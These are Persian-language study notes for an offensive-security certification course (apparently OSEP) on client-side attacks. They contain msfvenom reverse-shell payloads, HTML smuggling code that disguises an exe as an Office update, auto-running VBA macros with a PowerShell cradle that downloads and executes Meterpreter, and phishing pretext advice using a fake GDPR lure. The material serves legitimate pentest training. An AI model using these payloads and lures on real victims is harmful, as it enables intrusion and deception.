
---

## **بخش 1: اطلاعات دوره**

- **آزمون اختیاریه** و 120 روز بعد از اتمام لَب فرصت داری برای شرکت
- **استراتژی پیشنهادی**: ایمیل‌های خوش‌آمدگویی رو بخون → مطالب دوره رو مرور کن → تمرین‌ها رو انجام بده → ماشین‌های لَب رو حمله کن
- **تمرین‌ها**: بعضی سخت و زمان‌برن، باید صبور باشی (ذهنیت "Try Harder")
- **Extra Mile Exercises**: سخت‌تر و اختیاری، برای مهارت بیشتر

---

## **بخش 2: لَب VPN**

- **Control Panel**: برای revert کردن ماشین‌ها یا رزرو آزمون
- **Revert**: 12 بار در 24 ساعت، حداقل 5 دقیقه فاصله بین هر revert
- **ماشین‌های کلاینت**: اختصاصی برای هر ماژول، نمی‌تونی چند ماژول رو همزمان فعال کنی
- **Kali Linux**: توصیه می‌شه، پشتیبانی فقط برای Kali روی VMware

**محدودیت‌های لَب:**
- ARP spoofing ممنوع
- Brute force علیه VPN ممنوع
- حمله به ماشین دانشجوهای دیگه ممنوع

---

## **بخش 3: آزمون OSEP**

- **مدت**: 47 ساعت و 45 دقیقه برای حمله + 24 ساعت برای گزارش
- **هدف**: دسترسی به بخش خاصی از شبکه یا 100 امتیاز از compromise کردن ماشین‌ها
- **Proctored**: نظارت از راه دور، باید 15 دقیقه زودتر حاضر باشی
- **نتیجه**: ظرف 10 روز کاری اعلام می‌شه

---

## **بخش 4: تئوری برنامه‌نویسی**

### **سطوح زبان‌های برنامه‌نویسی:**

**Low-level (سطح پایین):**
- **Opcode**: دستورات باینری که CPU اجرا می‌کنه
- **Assembly**: نسخه خوانا‌تر opcodeها، معماری‌محور (مثل x86، ARM)
- **C**: نسبتاً low-level، مدیریت حافظه دستی (unmanaged code)

**High-level (سطح بالا):**
- **C++**: هم low-level و هم high-level، شی‌گرا (OOP)
- **Python, JavaScript, PowerShell**: زبان‌های اسکریپتی، شی‌گرا
- **Java, C#**: کامپایل به bytecode → اجرا توسط virtual machine (JVM یا CLR) → managed code
- **JIT compilation**: اسکریپت‌ها در زمان اجرا به native code کامپایل می‌شن

### **مفاهیم OOP:**
- **Class**: قالب برای ساخت اشیا
- **Object**: نمونه‌ای از کلاس
- **Constructor**: متد ویژه برای مقداردهی اولیه
- **Method**: توابع داخل کلاس

---

**نکته کلیدی**: لازم نیست برنامه‌نویس حرفه‌ای باشی، اما فهم کلی زبان‌ها و مفاهیم OS برای penetration testing خیلی مهمه.


این بخش درباره **Access Modifiers، مفاهیم ویندوز و حملات Client-Side** صحبت می‌کنه:

---

## **1. Access Modifiers در OOP**

- **public**: کد داخل و خارج کلاس می‌تونه بهش دسترسی داشته باشه
- **private**: فقط کد داخل کلاس می‌تونه استفاده کنه

```c#
public class MyClass
{
	private int myNumber;
	// constructor
	public MyClass(int aNumber)
	{
		this.myNumber = aNumber;
	}
	public getNumber()
	{
		return myNumber;
	}
}
```

**مثال**: در کد نمونه، constructor و متد `getNumber()` public هستن ولی متغیر `myNumber` private هست. برای خوندن مقدارش باید از متد عمومی استفاده کنی.

```c
BOOL GetUserNameA(
LPSTR lpBuffer,
LPDWORD pcbBuffer
);
```

---

## **2. مفاهیم ویندوز**

### **2.1 WOW64 (Windows On Windows 64-bit)**
- ویندوز 64-bit می‌تونه برنامه‌های 32-bit رو اجرا کنه
- از 4 کتابخانه 64-bit استفاده می‌کنه: `Ntdll.dll`, `Wow64.dll`, `Wow64Win.dll`, `Wow64Cpu.dll`
- **مسیرها**:
  - برنامه‌های 64-bit: `C:\Windows\System32`
  - برنامه‌های 32-bit: `C:\Windows\SysWOW64`
- **نکته مهم**: باید معماری هدف (32 یا 64-bit) رو بدونی تا shellcode مناسب رو استفاده کنی

### **2.2 Win32 API**
- APIهای از پیش ساخته شده برای توسعه‌دهندگان
- مثال: `GetUserNameA` (نسخه ASCII) و `GetUserNameW` (نسخه Unicode)
- **تفاوت ASCII و Unicode**:
  - ASCII: 1 بایت برای هر کاراکتر
  - Unicode: حداقل 2 بایت
- پسوند **A** = ASCII، پسوند **W** = Wide char (Unicode)

### **2.3 Windows Registry**
- پایگاه داده‌ای برای ذخیره تنظیمات سیستم
- **Hiveهای اصلی**:
  - **HKCU** (HKEY_CURRENT_USER): اطلاعات کاربر جاری، قابل نوشتن توسط کاربر
  - **HKLM** (HKEY_LOCAL_MACHINE): اطلاعات سیستم عامل، نیاز به دسترسی Admin
- **Wow6432Node**: بخش جداگانه برای تنظیمات 32-bit در سیستم 64-bit
- می‌تونی از طریق `regedit` یا Win32 API باهاش کار کنی

---

## **3. حملات Client-Side با Office**

### **سناریوی حمله:**
1. **Trojan/Dropper**: فایل مخرب (مثل سند Office) به قربانی ارسال می‌شه
2. **Staged Payload**: کد اولیه اجرا می‌شه و مرحله دوم رو از سرور مهاجم دانلود می‌کنه
3. **Implant/Agent**: کد مخرب روی سیستم قربانی اجرا می‌شه
4. **C2 (Command & Control)**: ارتباط با سرور مهاجم از طریق HTTP/HTTPS یا DNS

### **اصطلاحات کلیدی:**
- **Social Engineering/Phishing**: فریب کاربر برای اجرای کد مخرب
- **Dropper**: تروجان چندمرحله‌ای با callback
- **C2 Infrastructure**: زیرساخت فرمان و کنترل

**هدف ماژول**: دستیابی به اجرای کد از طریق سوءاستفاده از ویژگی‌های Microsoft Office

---

**نکته**: در دنیای واقعی مهاجمان از C2 پیچیده استفاده می‌کنن، ولی در این دوره مستقیماً با هدف ارتباط برقرار می‌کنیم (مثلاً با Metasploit).

## Staged vs Non-staged Payloads


# Staged vs Non-staged Payloads در Metasploit

## تفاوت اصلی

**Non-staged Payload** (مثل `windows/shell_reverse_tcp`):
- تمام کد لازم برای باز کردن reverse shell رو داره
- حجم بیشتر
- از delimiter `_` استفاده می‌کنه

**Staged Payload** (مثل `windows/shell/reverse_tcp`):
- حداقل کد رو داره که یه callback انجام میده
- بقیه کد رو از سرور دریافت و در memory اجرا می‌کنه
- حجم کمتر و احتمال bypass کردن آنتی‌ویروس بیشتره
- از delimiter `/` استفاده می‌کنه

**مثال مقایسه:**
windows/x64/meterpreter_reverse_https    → Non-staged
windows/x64/meterpreter/reverse_https    → Staged


---

## ساخت Dropper با msfvenom

### Non-staged Payload:

```bash
sudo msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.119.120 LPORT=444 \
  -f exe -o /var/www/html/shell.exe

sudo service apache2 start
```

**راه‌اندازی Listener با Netcat:**
```bash
sudo nc -lnvp 444
```

پارامترها:
- `-l`: listen mode
- `-n`: بدون DNS lookup
- `-v`: verbose output
- `-p`: شماره پورت

---

### Staged Meterpreter Payload:

**مقایسه حجم:**
```bash
# Non-staged
sudo msfvenom -p windows/x64/meterpreter_reverse_https \
  LHOST=192.168.119.120 LPORT=443 \
  -f exe -o /var/www/html/msfnonstaged.exe
# Payload size: 207449 bytes
# Final size: 214016 bytes

# Staged
sudo msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.119.120 LPORT=443 \
  -f exe -o /var/www/html/msfstaged.exe
# Payload size: 694 bytes
# Final size: 7168 bytes
```

**نکته**: Staged payload تقریباً 30 برابر کوچکتره!


![[Pasted image 20260423202800.png]]

---

### استفاده از multi/handler:

```bash
sudo msfconsole -q
```

msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf5 exploit(multi/handler) > set lhost 192.168.119.120
msf5 exploit(multi/handler) > set lport 443
msf5 exploit(multi/handler) > exploit


وقتی payload اجرا بشه، multi/handler مرحله دوم (207 KB) رو ارسال می‌کنه و Meterpreter session باز می‌شه.

---

## HTML Smuggling

این تکنیک از **HTML5 anchor tag** با attribute `download` استفاده می‌کنه تا فایل رو به صورت خودکار دانلود کنه.

### روش ساده (نیاز به کلیک):

```html
<html>
<body>
<a href="/msfstaged.exe" download="msfstaged.exe">DownloadMe</a>
</body>
</html>
```

---

### روش پیشرفته (بدون تعامل کاربر):

**مراحل:**
1. فایل رو Base64 encode کن و داخل JavaScript ذخیره کن
2. از **Blob object** برای ساخت یه URL file object استفاده کن
3. یه anchor tag نامرئی بساز که دانلود رو trigger کنه

**تابع Base64 Decoder:**
```javascript
function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}
```

**ساخت Blob و URL:**
```javascript
var blob = new Blob([data], {type: 'octet/stream'});
var url = window.URL.createObjectURL(blob);
```

**ساخت Anchor نامرئی:**
```javascript
var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
```

---

### کد کامل HTML Smuggling:

```html
<html>
<body>
<script>
function base64ToArrayBuffer(base64) {
var binary_string = window. atob(base64);
var len = binary_string.length;

var bytes = new Uint8Array( len );
for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
return bytes.buffer;

// 32bit simple reverse shell
var file = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAyAAAA
var blob = new Blob([file], {type: 'octet/stream'});
var fileName = 'Microsoft_office_update.exe';

if (window.navigator.msSaveOrOpenBlob) {
window.navigator.msSaveOrOpenBlob(blob, fileName);
} else {
var a = document.createElement('a');
console.log(a);
document.body. appendChild(a);
a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);

</script>
</body>
</html>
```



## تابع `base64ToArrayBuffer`

```javascript
function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) { 
        bytes[i] = binary_string.charCodeAt(i); 
    }
    return bytes.buffer;
}
```

**ورودی:** رشته base64  
**خروجی:** ArrayBuffer (بایت‌های خام)

- `window.atob(base64)`: رشته base64 رو decode میکنه به binary string
- `binary_string.charCodeAt(i)`: هر کاراکتر رو به کد ASCII/byte تبدیل میکنه
- `Uint8Array`: آرایه‌ای از بایت‌های 8-bit unsigned
- `bytes.buffer`: ArrayBuffer خام رو برمیگردونه

---

## متغیر `file`

```javascript
var file = 'TVqQAAMAAAAEAAAA//8AALgA...';
```

این رشته base64 encoded یه فایل PE (Portable Executable) هست - احتمالاً reverse shell.  
`TVqQ` = شروع MZ header (Magic bytes: `4D 5A` = "MZ")

---

## ساخت Blob

```javascript
var blob = new Blob([file], {type: 'octet/stream'});
var fileName = 'Microsoft_office_update.exe';
```

- `Blob`: یه object شبیه فایل که داده‌های binary رو نگه میداره
- **ورودی اول:** آرایه‌ای از داده‌ها (اینجا رشته base64)
- **ورودی دوم:** MIME type = `octet/stream` (فایل باینری)
- `fileName`: اسم فایلی که دانلود میشه

---

## دانلود فایل

### روش 1: Internet Explorer/Edge قدیمی

```javascript
if (window.navigator.msSaveOrOpenBlob) {
    window.navigator.msSaveOrOpenBlob(blob, fileName);
}
```

- `msSaveOrOpenBlob`: API مخصوص IE/Edge
- **ورودی:** (blob, filename)
- دیالوگ Save/Open رو نشون میده

### روش 2: مرورگرهای مدرن

```javascript
else {
    var a = document.createElement('a');
    document.body.appendChild(a);
    a.style = 'display: none';
    var url = window.URL.createObjectURL(blob);
    a.href = url;
    a.download = fileName;
    a.click();
    window.URL.revokeObjectURL(url);
}
```

- `createElement('a')`: یه لینک `<a>` میسازه
- `createObjectURL(blob)`: یه URL موقت برای blob میسازه (مثل `blob:http://...`)
- `a.download`: attribute که مرورگر رو مجبور به دانلود میکنه (نه باز کردن)
- `a.click()`: کلیک خودکار روی لینک → شروع دانلود
- `revokeObjectURL(url)`: URL موقت رو پاک میکنه (آزادسازی حافظه)

---

## خلاصه جریان

1. فایل exe به صورت base64 encode شده
2. Blob ساخته میشه
3. یه لینک مخفی ساخته میشه
4. کلیک خودکار → دانلود فایل با نام `Microsoft_office_update.exe`
5. URL موقت پاک میشه


---

### آماده‌سازی Payload:

```bash
# ساخت payload
sudo msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.119.120 LPORT=443 \
  -f exe -o /var/www/html/msfstaged.exe

# Base64 encoding
base64 /var/www/html/msfstaged.exe
```

**نکته مهم**: قبل از embed کردن، باید newline ها رو حذف کنی یا هر خط رو داخل quote بذاری.

---

## نکات امنیتی

- **SmartScreen Warning**: وقتی فایل از browser دانلود بشه، ویندوز اونو mark می‌کنه و ممکنه هشدار بده
- این تکنیک روی **Google Chrome** کار می‌کنه (پشتیبانی از `window.URL.createObjectURL`)
- برای **Internet Explorer** و **Microsoft Edge** باید از `window.navigator.msSaveBlob` استفاده کنی

---

## تمرین‌ها

1. با payloadهای مختلف staged و non-staged آزمایش کن
2. HTML smuggling رو با فرمت‌های مختلف فایل تست کن
3. کد رو برای Edge هم سازگار کن (با `msSaveBlob`)


## 3.2 Phishing with Microsoft Office

# فیشینگ با Microsoft Office - مقدمه و نصب

## مقدمه

تا اینجا، حملات ما نیاز به تعامل مستقیم با قربانی داشتند - یا باید فایلی دانلود می‌کرد یا از یک سایت مخرب بازدید می‌کرد. این حملات مفاهیم رایجی را نشان دادند که در حملات سمت کاربر (client-side) کار می‌کنند، از جمله قابلیت trigger خودکار دانلود فایل مخرب.

در این بخش، توجه خود را به یک بردار حمله client-side دیگر معطوف می‌کنیم که به‌طور گسترده مورد سوءاستفاده قرار می‌گیرد: **برنامه‌های Microsoft Office**.

### چرا Microsoft Office؟

- Microsoft Office یک مجموعه نرم‌افزاری بسیار محبوب است که اکثریت سازمان‌ها و شرکت‌ها از آن استفاده می‌کنند
- دو نوع دارد:
  - **Office 365**: به‌طور مداوم به‌روزرسانی می‌شود و برای ذخیره‌سازی آنلاین استفاده می‌شود
  - **نسخه‌های standalone** مانند Office 2016

به دلیل محبوبیت بالا، برنامه‌های Office هدف اصلی فیشینگ هستند چون قربانیان تمایل دارند به آن‌ها اعتماد کنند. گزارش امنیت سایبری سالانه Cisco در سال 2018 نشان داد که Office هدف **38% از تمام حملات فیشینگ ایمیلی** بوده است.

حالا این بردار حمله محبوب را بررسی می‌کنیم که از طریق زبان برنامه‌نویسی تعبیه‌شده **Visual Basic for Applications (VBA)** استفاده می‌شود.

---

## 3.2.1 نصب Microsoft Office

قبل از اینکه بتوانیم Microsoft Office را مورد سوءاستفاده قرار دهیم، باید آن را روی VM ویندوز 10 قربانی نصب کنیم.

### مراحل نصب:

1. به مسیر `C:\installs\Office2016.img` در File Explorer بروید
2. روی آن دابل‌کلیک کنید - این فایل را به‌عنوان یک CD مجازی لود می‌کند
3. نصب را از `Setup.exe` شروع کنید
4. پس از اتمام نصب، روی Close کلیک کنید
5. Microsoft Word را از منوی Start باز کنید
6. پاپ‌آپ Product key را با کلیک روی ضربدر گوشه بالا-راست ببندید تا trial 7 روزه شروع شود
7. توافقنامه لایسنس را با کلیک روی "Accept and start Word" بپذیرید


![[Pasted image 20260424155304.png]]

> **نکته مهم:** در این ماژول، ما ماکرو و اسناد Office را روی دستگاه قربانی ایجاد می‌کنیم، اما در یک تست نفوذ واقعی، این کار باید روی یک دستگاه توسعه محلی انجام شود نه روی یک هاست compromise شده.

---

## 3.2.2 مقدمه‌ای بر VBA

در این ماژول، اصول VBA را همراه با مکانیزم‌های امنیتی تعبیه‌شده Microsoft Office بررسی می‌کنیم.

### ایجاد اولین ماکرو

1. Microsoft Word را روی ماشین قربانی ویندوز 10 باز کنید
2. یک سند جدید ایجاد کنید
3. به تب **View** بروید و **Macros** را انتخاب کنید
4. از منوی dropdown، سند فعلی را انتخاب کنید (برای سند بدون نام: "Document1 (document)")
   - این تضمین می‌کند که کد VBA فقط در این سند embed شود، نه در template سراسری
5. نامی برای ماکرو وارد کنید (مثلاً "MyMacro")
6. روی **Create** کلیک کنید - ویرایشگر VBA باز می‌شود

![[Pasted image 20260424155327.png]]
![[Pasted image 20260424155340.png]]


### ساختار پایه VBA

وقتی یک ماکرو ایجاد می‌کنید، ویرایشگر به‌طور خودکار یک کد شروع کوچک می‌سازد:


![[Pasted image 20260424155410.png]]


```vba
Sub MyMacro()

End Sub
```

- `Sub MyMacro`: شروع یک متد به نام "MyMacro"
- `End Sub`: پایان متد
- **نکته:** در VBA، یک `Sub` نمی‌تواند مقداری به فراخواننده برگرداند، اما یک `Function` می‌تواند

### تعریف متغیرها

متغیرها باید قبل از استفاده با کلمه کلیدی `Dim` تعریف شوند:

```vba
Dim myString As String
Dim myLong As Long
Dim myPointer As LongPtr
```

**انواع داده رایج:**
- `String`: رشته unicode
- `Long`: عدد صحیح 64-بیتی
- `LongPtr`: اشاره‌گر حافظه

این انواع داده مستقیماً به انواع داده native سیستم‌عامل ترجمه می‌شوند و معمولاً در زبان‌هایی مانند C یا C++ استفاده می‌شوند.

---

### دستورات کنترل جریان

#### If و Else

```vba
Sub MyMacro()
    Dim myLong As Long
    myLong = 1
    
    If myLong < 5 Then
        MsgBox ("True")
    Else
        MsgBox ("False")
    End If
End Sub
```

- `If ... Then`: اگر شرط برقرار باشد
- `Else`: در غیر این صورت
- `End If`: پایان شرط
- `MsgBox`: تابع built-in برای نمایش پیام

**اجرای ماکرو:** روی دکمه "Run Macro" کلیک کنید یا F5 بزنید.

![[Pasted image 20260424155445.png]]

#### حلقه For

```vba
Sub MyMacro()
    For counter = 1 To 3
        MsgBox ("Alert")
    Next counter
End Sub
```

- حلقه `For` شمارنده را از 1 تا 3 می‌خواند
- هر بار که به `Next` می‌رسد، مقدار counter یک واحد افزایش می‌یابد
- این ماکرو سه message box "Alert" نمایش می‌دهد

---

### اجرای خودکار ماکرو

برای اینکه ماکرو به‌طور خودکار هنگام باز شدن سند اجرا شود، از متدهای زیر استفاده می‌کنیم:

- `Document_Open()`: هنگام باز شدن سند اجرا می‌شود
- `AutoOpen()`: برای افزونگی (redundancy)

> **نکته:** تفاوت‌هایی بین برنامه‌های مختلف Office وجود دارد. مثلاً `Document_Open()` در Excel به `Workbook_Open()` تغییر نام می‌یابد.

```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    MsgBox ("This is a macro test")
End Sub
```

**ذخیره سند:**
- باید در فرمت Macro-Enabled ذخیره شود: `.doc` یا `.docm`
- فرمت جدیدتر `.docx` ماکروها را ذخیره نمی‌کند
- فرمت `.doc` را انتخاب کنید (Word 97-2003 Document)

---

### مکانیزم‌های امنیتی Office

وقتی سند را دوباره باز می‌کنید، یک **بنر هشدار امنیتی** نمایش داده می‌شود:

SECURITY WARNING: Macros have been disabled.
[Enable Content]

![[Pasted image 20260424155528.png]]


این تنظیم امنیتی پیش‌فرض تمام برنامه‌های Office است. یعنی در حمله client-side باید قربانی را متقاعد کنیم که:
1. سند را باز کند
2. ماکرو را فعال کند

#### بررسی تنظیمات امنیتی

مسیر: **File > Options > Trust Center > Trust Center Settings**

**تنظیم پیش‌فرض:** "Disable all macros with notification"


![[Pasted image 20260424155544.png]]

![[Pasted image 20260424155601.png]]


#### Protected View

ویژگی sandbox که در Microsoft Office 2010 معرفی شد و زمانی فعال می‌شود که اسناد از اینترنت می‌آیند.

**وقتی Protected View فعال است:**
- ماکروها غیرفعال می‌شوند
- تصاویر خارجی مسدود می‌شوند
- یک پیام هشدار اضافی نمایش داده می‌شود

این وضعیت را پیچیده‌تر می‌کند چون حمله client-side ما باید کاربر را فریب دهد تا Protected View را هم خاموش کند.

![[Pasted image 20260424155617.png]]


---

### اجرای برنامه‌های خارجی

#### روش 1: استفاده از تابع Shell

```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```

**پارامترهای تابع `Shell`:**
1. مسیر و نام برنامه + آرگومان‌ها
2. `WindowStyle`: سبک پنجره
   - `vbHide` یا `0`: پنجره را مخفی می‌کند

#### روش 2: استفاده از Windows Script Host (WSH)

```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```

- `CreateObject("Wscript.Shell")`: یک شی WSH ایجاد می‌کند
- `.Run str, 0`: متد Run را فراخوانی می‌کند
  - پارامتر اول: مسیر برنامه
  - پارامتر دوم: سبک پنجره (0 = مخفی)

### تأیید اجرا

از **Process Explorer** (SysInternals) استفاده کنید:
- مسیر: `C:\Tools`
- `cmd.exe` را به‌عنوان فرآیند فرزند `WINWORD.EXE` مشاهده خواهید کرد

---

## خلاصه

در این بخش یاد گرفتیم:
- اصول VBA و ماکروهای Microsoft Office
- دستورات `If` و حلقه‌های `For`
- Trust Center و تنظیمات امنیتی
- پسوندهای مختلف فایل برای ذخیره ماکروها
- نحوه اجرای برنامه‌های خارجی از طریق VBA

در بخش بعدی، روی این مبانی بنا می‌کنیم تا یاد بگیریم چگونه shellcode Meterpreter را اجرا کنیم.

![[Pasted image 20260424155641.png]]


---

### تمرین

1. Microsoft Office را روی VM کلاینت ویندوز 10 خود نصب کنید.

## 3.2.3 Let PowerShell Help Us

# ادغام PowerShell با حملات فیشینگ Office

## مقدمه

تا اینجا روی Microsoft Office و مکانیزم‌های پایه ماکروهای VBA تمرکز کردیم. حالا بررسی می‌کنیم چگونه می‌توانیم از محیط قدرتمند و انعطاف‌پذیر **PowerShell** همراه با حملات فیشینگ از طریق اسناد Word یا Excel استفاده کنیم.

### تفاوت VBA و PowerShell

- **VBA**: زبان کامپایل شده که از انواع داده (types) استفاده می‌کند
- **PowerShell**: 
  - از طریق .NET framework کامپایل و اجرا می‌شود
  - معمولاً از انواع داده استفاده نمی‌کند
  - انعطاف بیشتری دارد

### سینتکس پایه PowerShell

**تعریف متغیر:**
```powershell
$variableName
```
فقط با علامت دلار ($) شروع می‌شود.

**عملگرهای مقایسه:**
- به جای `==` از `-eq` استفاده می‌شود
- به جای `!=` از `-ne` استفاده می‌شود

---

## Download Cradles در PowerShell

چون PowerShell به .NET framework دسترسی دارد، می‌توانیم تکنیک‌های تخصصی مانند **download cradles** را پیاده‌سازی کنیم تا محتوا (مثل payloadهای مرحله دوم) را از سرورهای خارجی دانلود کنیم.

### کلاس Net.WebClient

رایج‌ترین روش استفاده از کلاس `Net.WebClient` است. با ایجاد یک شی از این کلاس، می‌توانیم متد `DownloadFile` را فراخوانی کنیم.

#### نسخه چند خطی:

```powershell
$url = "http://192.168.119.120/msfstaged.exe"
$out = "msfstaged.exe"
$wc = New-Object Net.WebClient
$wc.DownloadFile($url, $out)
```

**توضیح:**
1. متغیر `$url`: آدرس فایل برای دانلود
2. متغیر `$out`: نام فایل محلی
3. ایجاد شی از کلاس `Net.WebClient`
4. فراخوانی متد `DownloadFile` با دو آرگومان (URL و نام خروجی)

#### نسخه یک خطی (one-liner):

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')
```

> **نکته:** اکثر download cradleهای PowerShell از HTTP یا HTTPS استفاده می‌کنند، اما می‌توان download cradle ساخت که از TXT records و DNS transport استفاده کند.

---

## ادغام PowerShell با VBA

حالا این one-liner را در ماکرو Word با استفاده از VBA embed می‌کنیم و اجازه می‌دهیم PowerShell کار سنگین را انجام دهد.

### مراحل کلی:

1. تبدیل رشته PowerShell برای کار در VBA
2. زمان دادن به سیستم برای دانلود فایل
3. اجرای فایل دانلود شده

### کد VBA برای دانلود فایل:

```vba
Dim str As String
str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
Shell str, vbHide
```

**توضیح:**
- متغیر `str` حاوی دستور PowerShell است
- `Shell str, vbHide`: اجرای PowerShell با خروجی مخفی

> **پیش‌نیاز:** فایل `msfstaged.exe` باید روی وب‌سرور Kali قرار داشته باشد و یک listener `multi/handler` فعال باشد.

---

## دریافت مسیر فایل دانلود شده

فایل‌های دانلود شده در پوشه فعلی سند Word قرار می‌گیرند. می‌توانیم مسیر را با `ActiveDocument.Path` بدست آوریم:

```vba
Dim exePath As String
exePath = ActiveDocument.Path + "\msfstaged.exe"
```

---

## پیاده‌سازی تأخیر زمانی (Wait)

چون زمان دانلود متغیر است، باید یک تأخیر زمانی اضافه کنیم. Microsoft Word تابع `Wait` یا `Sleep` ندارد، پس یک متد سفارشی می‌سازیم:

```vba
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

**توضیح:**
- `n`: تعداد ثانیه‌های انتظار
- `t = Now`: زمان فعلی را ذخیره می‌کند
- `Do ... Loop Until`: حلقه تا زمانی که شرط برقرار شود
- `DateAdd("s", n, t)`: n ثانیه به زمان شروع اضافه می‌کند
- `DoEvents`: اجازه پردازش اقدامات دیگر را می‌دهد تا Word مسدود نشود

**منطق:** حلقه تا زمانی ادامه می‌یابد که زمان فعلی از زمان شروع + n ثانیه بیشتر شود.

---

## کد کامل ماکرو VBA

```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    
    Dim exePath As String
    exePath = ActiveDocument.Path + "\msfstaged.exe"
    
    Wait (2)
    
    Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

### مرور کد:

1. **دانلود:** سند Word فایل Meterpreter را از وب‌سرور دانلود می‌کند (هنگام باز شدن و فعال کردن ماکرو)
2. **تأخیر:** 2 ثانیه صبر می‌کند تا دانلود کامل شود
3. **اجرا:** فایل را به‌صورت مخفی اجرا می‌کند
4. **نتیجه:** یک reverse shell Meterpreter برقرار می‌شود

---

## تمرین‌ها

1. ماکرو Word را برای دریافت reverse shell تکرار کنید و آن را در Excel پیاده‌سازی کنید
2. با download cradle دیگری مانند `Invoke-WebRequest` آزمایش کنید

---

## 3.3 حفظ ظاهر (Keeping Up Appearances)

حالا که می‌دانیم چگونه از سند Word و ماکرو برای دسترسی از راه دور استفاده کنیم، باید به جنبه انسانی‌تر حمله توجه کنیم: **متقاعد کردن قربانی برای اجرای آن**.

### چالش‌های حمله فیشینگ

در حمله فیشینگ سمت کاربر، باید قربانی را فریب دهیم - گاهی چندین بار:
- باز کردن فایل
- فعال کردن گزینه‌ها (مثل فعال کردن ماکروها)
- مراجعه به یک URL خاص

همه این‌ها باید بدون هشدار دادن به قربانی انجام شود.

### Pretexting (بهانه‌سازی)

**Pretext چیست؟**
- یک انگیزه کاذب
- دروغی که در حمله مهندسی اجتماعی استفاده می‌شود
- هدف: متقاعد کردن هدف برای انجام کاری که معمولاً انجام نمی‌دهد

این تکنیک برای موفقیت حملات client-side ضروری است.


## 3.3.1 Phishing PreTexting

# تکنیک‌های مهندسی اجتماعی در حملات فیشینگ

## مکانیزم‌های رایج فیشینگ

حمله فیشینگ از رفتار قربانی سوءاستفاده می‌کند و از کنجکاوی یا ترس آن‌ها برای تشویق به اجرای payload استفاده می‌کند - حتی برخلاف قضاوت بهتر آن‌ها.

### موضوعات محبوب فیشینگ:

بسته به سازمان هدف و کارمندان خاص:
- درخواست‌های شغلی (Job applications)
- به‌روزرسانی قراردادهای بهداشتی (Healthcare contract updates)
- صورت‌حساب‌ها (Invoices)
- درخواست‌های منابع انسانی (HR requests)

---

## تکنیک استاندارد فیشینگ با Microsoft Office

### الگوی رایج:

1. **ارائه سند:** مهاجم یک سند ارائه می‌دهد
2. **ادعای رمزگذاری:** بیان می‌کند که سند رمزگذاری شده یا محافظت شده است
3. **درخواست فعال‌سازی:** پیشنهاد می‌کند که کاربر باید **Enable Editing** و **Enable Content** را فعال کند تا سند به درستی نمایش داده شود

### نمونه‌های واقعی:

این تکنیک در بدافزارهای محبوب استفاده شده است:
- **Quasat RAT**
- **Ursnif Trojan**

---

## کاهش سوءظن قربانی

پس از باز کردن سند، باید سعی کنیم شک‌های قربانی را کاهش دهیم.

### خطرات سند ضعیف:

اگر سند به‌خوبی ساخته نشده یا شبیه اسپم باشد:
- قربانی ممکن است پرسنل پشتیبانی را مطلع کند
- حمله ما به خطر می‌افتد

### بهترین شیوه‌ها:

1. **از اشتباهات املایی و گرامری اجتناب کنید**
2. **محتوا باید با سبک فریب مطابقت داشته باشد**
3. **سند را قانونی جلوه دهید:**
   - نام محصولات شناخته شده را اضافه کنید
   - لوگوهایی که کاربران به آن‌ها اعتماد دارند (مثل Microsoft)
   - استانداردهای رمزگذاری (مثل RSA)

---

## مثال عملی: سند درخواست شغلی

### سناریو:

پیشنهاد می‌کنیم که سند درخواست شغلی پیوست شده برای محافظت از محتوای آن مطابق با مقررات **GDPR** رمزگذاری شده است.

### چرا این کار می‌کند؟

اگر قربانی پیشینه فنی قوی نداشته باشد:
- اصطلاحات اضافه شده
- "جادوی فنی" (tech magic)
- سند را قانونی‌تر جلوه می‌دهد

### پیاده‌سازی:

[متن تصادفی base64-encoded]

GDPR Compliance Notice:
This document contains sensitive personal information and has been 
encrypted in accordance with General Data Protection Regulation (GDPR) 
requirements. Please enable macros to decrypt and view the content.


**عناصر کلیدی:**
- متن base64 تصادفی (برای ایجاد حس رمزگذاری)
- یادداشت درباره انطباق با GDPR
- دستورالعمل واضح برای فعال کردن ماکروها

---

## خلاصه استراتژی

برای موفقیت در حمله فیشینگ با Office:

1. **Pretexting قوی:** انتخاب سناریوی مناسب برای سازمان هدف
